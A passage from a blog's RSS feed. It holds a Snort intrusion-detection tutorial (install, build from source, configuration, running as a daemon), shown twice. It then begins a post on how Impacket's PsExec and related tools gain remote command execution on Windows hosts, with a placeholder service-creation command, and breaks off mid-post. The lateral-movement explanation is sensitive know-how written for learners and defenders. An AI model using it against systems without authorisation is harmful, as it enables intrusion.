&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;snort-install&#34;&gt;Snort Install&lt;/h2&gt;
&lt;p&gt;Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in &lt;a href=&#34;https://github.com/snort3/snort3#readme&#34;&gt;GitHub&lt;/a&gt;, I clone their GitHub repository and run these commands:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ git clone https://github.com/snort3/snort3.git  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ cd snort3
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Then, I’ll build the program. You’ll need &lt;code&gt;cmake&lt;/code&gt; among other packages in order to do this, so I’ve included the install command for those packages.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; sudo apt install &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;y gcc cmake libpcre3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev zlib1g&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libluajit&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libpcap&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev openssl libssl&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libnghttp2&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev libdumbnet&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;dev bison flex autoconf libtool  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;./&lt;/span&gt;configure\_cmake&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;sh &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;prefix&lt;span style=&#34;color:#f92672&#34;&gt;=$&lt;/span&gt;(pwd) &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;with&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;daq&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;libraries&lt;span style=&#34;color:#f92672&#34;&gt;=/&lt;/span&gt;path&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;to&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;libdaq&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; cd build  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; make &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;j &lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt;(nproc) install
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;configuration&#34;&gt;Configuration&lt;/h1&gt;
&lt;h2 id=&#34;capturing-all-networktraffic&#34;&gt;Capturing all Network Traffic&lt;/h2&gt;
&lt;p&gt;To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo ip link set wlan0 promisc on
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;modifying-the-configuration-file&#34;&gt;Modifying the Configuration File&lt;/h2&gt;
&lt;p&gt;Most configurations will go within &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo vim /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*pngRmEDDXcscoXuasWQFdQ.png&#34; alt=&#34;&#34;  /&gt;

On line 45 of the configuration file, we’ll change the value of &lt;code&gt;HOME_NET&lt;/code&gt; from &lt;code&gt;any&lt;/code&gt; to be the network that you would like to monitor. In my case, it is &lt;code&gt;192.168.1.0/24&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*uPIpmb3Q2AUJj3v3GkL2lQ.png&#34; alt=&#34;&#34;  /&gt;

I would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.&lt;/p&gt;
&lt;p&gt;Rules are included in step #7. The syntax for rule files is &lt;code&gt;include /path/to/rule.rules&lt;/code&gt;. In this case, &lt;code&gt;$RULE_PATH&lt;/code&gt; refers to &lt;code&gt;/etc/snort&lt;/code&gt;. You can include multiple rule files and add your own under &lt;code&gt;/etc/snort/local.rules&lt;/code&gt; or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*Pz6IDFwxqQwrMWmZS83kQg.png&#34; alt=&#34;&#34;  /&gt;

As a side note, if you would like to download the latest community rules, you can find them at the &lt;a href=&#34;https://www.snort.org/downloads#rules&#34;&gt;official website&lt;/a&gt;. You would extract the tarball and add the rule files to your &lt;code&gt;/etc/snort/snort.conf&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; wget https:&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;www&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;snort&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;org&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;downloads&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snort3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rules&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;$&lt;/span&gt; tar &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xf snort3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;community&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rules&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;tar&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;gz
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;running-snort&#34;&gt;Running Snort&lt;/h1&gt;
&lt;p&gt;Once you have your configuration file created, you can test that everything works with the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/1*4STD2kRrAx3xnRfCA7ALqA.png&#34; alt=&#34;&#34;  /&gt;

To actually run Snort as a daemon, you would change the &lt;code&gt;-T&lt;/code&gt; option to &lt;code&gt;-D&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ sudo snort -D -i eth0 -c /etc/snort/snort.conf  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Spawning daemon child...  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;My daemon child 197993 lives...  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Daemon parent exiting (0)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;To verify that it is working, you can use &lt;code&gt;ps aux&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$ ps aux | grep snort  
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All alerts from Snort will be sent to &lt;code&gt;/var/log/snort/alert&lt;/code&gt; unless otherwise specified in a command line argument.&lt;/p&gt;
&lt;h1 id=&#34;moving-forward&#34;&gt;Moving Forward&lt;/h1&gt;
&lt;p&gt;For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their &lt;code&gt;man&lt;/code&gt; page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.&lt;/p&gt;
</description>
      <content:encoded><![CDATA[<h1 id="introduction">Introduction</h1>
<p>Snort is an open source Intrusion Prevention System (IPS) that detects malicious network traffic by comparing the network packets to a set of rules, often created by Snort and the community. Snort can be used as a packet sniffer, packet logger, and intrusion prevention system.</p>
<p>In this article, I’ll go over some of the first steps of installing, configuring, and running Snort so that new users have a place to branch off of.</p>
<h1 id="quick-install">Quick Install</h1>
<p>You can install this on Ubuntu easily with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt-get install snort
</span></span></code></pre></div><h2 id="kali-linux">Kali Linux</h2>
<p>For my Kali friends, you might get the message that you’re unable to locate the <code>snort</code> package when trying to install it. This happens because the repositories that your distribution looks into when searching for apt packages doesn’t contain <code>snort</code>. To fix this, you can try to append the following repos to your <code>/etc/apt/sources.list</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>deb http://http.kali.org/kali kali-rolling main non-free contrib  
</span></span><span style="display:flex;"><span>deb http://http.kali.org/kali sana main non-free contrib  
</span></span><span style="display:flex;"><span>deb http://security.kali.org/kali-security sana/updates main contrib non-free  
</span></span><span style="display:flex;"><span>deb http://old.kali.org/kali moto main non-free contrib
</span></span></code></pre></div><p>Let the changes take effect and install Snort.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt-get update  
</span></span><span style="display:flex;"><span>$ sudo apt-get install snort
</span></span></code></pre></div><h1 id="building-fromsource">Building From Source</h1>
<p>If you’re crazy enough to build Snort from the source code, this section is for you.</p>
<h2 id="installing-dependencies">Installing Dependencies</h2>
<p>Before you can build Snort, you must first install its dependencies. These are listed in their <a href="https://github.com/snort3/snort3#dependencies">README.md</a> on GitHub, but for the sake of brevity, I’ll put some of them here. Keep in mind that some of the dependencies have more dependencies which is why some appear below and not in the documentation.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>sudo apt update <span style="color:#f92672">&amp;&amp;</span> apt install <span style="color:#f92672">-</span>y gcc libpcre3<span style="color:#f92672">-</span>dev zlib1g<span style="color:#f92672">-</span>dev libluajit<span style="color:#f92672">-</span><span style="color:#ae81ff">5.1</span><span style="color:#f92672">-</span>dev   
</span></span><span style="display:flex;"><span>libpcap<span style="color:#f92672">-</span>dev openssl libssl<span style="color:#f92672">-</span>dev libnghttp2<span style="color:#f92672">-</span>dev libdumbnet<span style="color:#f92672">-</span>dev   
</span></span><span style="display:flex;"><span>bison flex libdnet autoconf libtool cmake
</span></span></code></pre></div><h2 id="daq">DAQ</h2>
<p>Snort has another depenency called DAQ that needs to be installed. I’ll be downloading their latest release form GitHub and extracting it in a folder called <code>daq</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ wget https://github.com/snort3/libdaq/archive/refs/tags/v3.0.11.zip  
</span></span><span style="display:flex;"><span>$ unzip v3.0.11.zip -d daq &amp;&amp; cd daq/libdaq-3.0.11
</span></span></code></pre></div><p>After downloading and extracting it, I’ll run <code>bootstrap</code> to generate the configuration script and then proceed to install it.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ./bootstrap  
</span></span><span style="display:flex;"><span>$ ./configure &amp;&amp; make &amp;&amp; sudo make install
</span></span></code></pre></div><h2 id="hwloc">hwloc</h2>
<p>Another dependency is <code>hwloc</code>. You can find additional methods of installation on their <a href="https://github.com/open-mpi/hwloc">GitHub</a> and <a href="https://www.open-mpi.org/software/hwloc/v2.9/">website</a>. This is the way that I did it:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/open-mpi/hwloc.git  
</span></span><span style="display:flex;"><span>$ cd hwloc &amp;&amp; ./autogen.sh  
</span></span><span style="display:flex;"><span>$ ./configure &amp;&amp; make &amp;&amp; sudo make install
</span></span></code></pre></div><h2 id="openssl">OpenSSL</h2>
<p>If you don’t already have <code>openssl</code> installed on your system, you could install it from source:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/openssl/openssl.git &amp;&amp; cd openssl  
</span></span><span style="display:flex;"><span>$ ./Configure &amp;&amp; make &amp;&amp; make test
</span></span></code></pre></div><p>It is also possible to install it through <code>apt</code>. You may still need to install some additional headers for Snort to work. For this, you can try</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo apt install libssl-dev openssl
</span></span></code></pre></div><h2 id="snort-install">Snort Install</h2>
<p>Finally, we can start building Snort. I’ll be building directly from their source code on GitHub. Following the instructions on their README.md in <a href="https://github.com/snort3/snort3#readme">GitHub</a>, I clone their GitHub repository and run these commands:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ git clone https://github.com/snort3/snort3.git  
</span></span><span style="display:flex;"><span>$ cd snort3
</span></span></code></pre></div><p>Then, I’ll build the program. You’ll need <code>cmake</code> among other packages in order to do this, so I’ve included the install command for those packages.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">$</span> sudo apt install <span style="color:#f92672">-</span>y gcc cmake libpcre3<span style="color:#f92672">-</span>dev zlib1g<span style="color:#f92672">-</span>dev libluajit<span style="color:#f92672">-</span><span style="color:#ae81ff">5.1</span><span style="color:#f92672">-</span>dev libpcap<span style="color:#f92672">-</span>dev openssl libssl<span style="color:#f92672">-</span>dev libnghttp2<span style="color:#f92672">-</span>dev libdumbnet<span style="color:#f92672">-</span>dev bison flex autoconf libtool  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> <span style="color:#f92672">./</span>configure\_cmake<span style="color:#f92672">.</span>sh <span style="color:#f92672">--</span>prefix<span style="color:#f92672">=$</span>(pwd) <span style="color:#f92672">--</span>with<span style="color:#f92672">-</span>daq<span style="color:#f92672">-</span>libraries<span style="color:#f92672">=/</span>path<span style="color:#f92672">/</span>to<span style="color:#f92672">/</span>libdaq<span style="color:#f92672">-</span><span style="color:#ae81ff">3.0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">11</span>  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> cd build  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> make <span style="color:#f92672">-</span>j <span style="color:#f92672">$</span>(nproc) install
</span></span></code></pre></div><h1 id="configuration">Configuration</h1>
<h2 id="capturing-all-networktraffic">Capturing all Network Traffic</h2>
<p>To start, we’ll set our network adapter to run in promiscuous mode. This means that it will capture all packets on the network rather than only the ones that were assigned to be captured by it. This can be done through WiFi settings or through the command line.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo ip link set wlan0 promisc on
</span></span></code></pre></div><h2 id="modifying-the-configuration-file">Modifying the Configuration File</h2>
<p>Most configurations will go within <code>/etc/snort/snort.conf</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo vim /etc/snort/snort.conf
</span></span></code></pre></div><p>There’s many configuration options within this file that are broken up into 9 sections. Most of our changes will be in section 1.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*pngRmEDDXcscoXuasWQFdQ.png" alt=""  />

On line 45 of the configuration file, we’ll change the value of <code>HOME_NET</code> from <code>any</code> to be the network that you would like to monitor. In my case, it is <code>192.168.1.0/24</code>.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*uPIpmb3Q2AUJj3v3GkL2lQ.png" alt=""  />

I would encourage you to go through the other variables in the configuration file to include the ports and hosts that are running various services so that Snort can detect them and apply the rules to them.</p>
<p>Rules are included in step #7. The syntax for rule files is <code>include /path/to/rule.rules</code>. In this case, <code>$RULE_PATH</code> refers to <code>/etc/snort</code>. You can include multiple rule files and add your own under <code>/etc/snort/local.rules</code> or whichever file name that you configure for you own rules. This structure allows you to compartmentalize various rule sets and keep them organized.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*Pz6IDFwxqQwrMWmZS83kQg.png" alt=""  />

As a side note, if you would like to download the latest community rules, you can find them at the <a href="https://www.snort.org/downloads#rules">official website</a>. You would extract the tarball and add the rule files to your <code>/etc/snort/snort.conf</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span><span style="color:#f92672">$</span> wget https:<span style="color:#f92672">//</span>www<span style="color:#f92672">.</span>snort<span style="color:#f92672">.</span>org<span style="color:#f92672">/</span>downloads<span style="color:#f92672">/</span>community<span style="color:#f92672">/</span>snort3<span style="color:#f92672">-</span>community<span style="color:#f92672">-</span>rules<span style="color:#f92672">.</span>tar<span style="color:#f92672">.</span>gz  
</span></span><span style="display:flex;"><span><span style="color:#f92672">$</span> tar <span style="color:#f92672">-</span>xf snort3<span style="color:#f92672">-</span>community<span style="color:#f92672">-</span>rules<span style="color:#f92672">.</span>tar<span style="color:#f92672">.</span>gz
</span></span></code></pre></div><h1 id="running-snort">Running Snort</h1>
<p>Once you have your configuration file created, you can test that everything works with the following command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo snort -T -i wlan0 -c /etc/snort/snort.conf
</span></span></code></pre></div><p>You will get a lot of output. The most important pieces of information to be aware of in this output are the Snort rules. Here, you will be able to see how many were loaded in.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4STD2kRrAx3xnRfCA7ALqA.png" alt=""  />

To actually run Snort as a daemon, you would change the <code>-T</code> option to <code>-D</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ sudo snort -D -i eth0 -c /etc/snort/snort.conf  
</span></span><span style="display:flex;"><span>Spawning daemon child...  
</span></span><span style="display:flex;"><span>My daemon child 197993 lives...  
</span></span><span style="display:flex;"><span>Daemon parent exiting (0)
</span></span></code></pre></div><p>To verify that it is working, you can use <code>ps aux</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>$ ps aux | grep snort  
</span></span><span style="display:flex;"><span>root 196973 0.0 0.3 450316 118644 ? Ssl 10:25 0:00 snort -D -i wlan0 -c /etc/snort/snort.conf
</span></span></code></pre></div><p>All alerts from Snort will be sent to <code>/var/log/snort/alert</code> unless otherwise specified in a command line argument.</p>
<h1 id="moving-forward">Moving Forward</h1>
<p>For those who are interested in learning Snort on a deeper level, one recommendation is learning how to create your own rules and learning what the other configuration options are. It may be worth it to read their <code>man</code> page as well to be aware of options available on the CLI. You can also combine Snort with a SIEM such as Splunk and other solutions like pfSense.</p>
]]></content:encoded>
    </item>
    <item>
      <title>Windows Remoting: Difference between psexec, wmiexec, atexec, *exec</title>
      <link>https://ally-petitt.github.io:443/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</link>
      <pubDate>Fri, 09 Dec 2022 00:00:00 +0000</pubDate>
      <guid>https://ally-petitt.github.io:443/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/</guid>
      <description>&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*2pekupqLLWtBkgpl&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&#34;&gt;https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress&amp;amp;cs=tinysrgb&amp;amp;w=1260&amp;amp;h=750&amp;amp;dpr=1&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;If you’re anything like me, you discovered &lt;a href=&#34;https://github.com/SecureAuthCorp/impacket&#34;&gt;Impacket&lt;/a&gt;, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.&lt;/p&gt;
&lt;h1 id=&#34;psexec&#34;&gt;PsExec&lt;/h1&gt;
&lt;p&gt;PsExec works by writing a randomly-named binary to the &lt;code&gt;ADMIN$&lt;/code&gt; SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sc create [serviceName] binPath&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;C:\Windows\[uploaded-binary].exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;All of your command input and output occurs over the named pipe via SMB (445/TCP).&lt;/p&gt;
&lt;p&gt;As pointed out by &lt;a href=&#34;https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;&gt;Jeremy Dupuis&lt;/a&gt;, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*Pj8MeQykWNNX4Kr_.png&#34; alt=&#34;Picture of an error log from this article: https://jb05s.github.io/Attacking-Windows-Lateral-Movement-with-Impacket/&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;https://cdn-images-1.medium.com/max/800/0*8jYiFbXMIpkEf-r1.png&#34; alt=&#34;&#34;  /&gt;

&lt;em&gt;&lt;a href=&#34;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&#34;&gt;https://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;As you can see, the logs showed:&lt;/p&gt;
&lt;ul&gt;
